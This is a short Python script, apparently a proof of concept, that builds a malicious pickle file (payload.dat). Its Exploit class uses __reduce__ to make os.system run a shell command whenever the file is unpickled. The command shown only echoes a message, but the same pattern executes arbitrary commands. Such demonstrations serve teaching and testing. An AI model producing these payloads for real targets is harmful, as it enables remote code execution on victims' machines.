import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo "Remote Code Execution"',))

def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(Exploit(), f)

serialize_exploit()
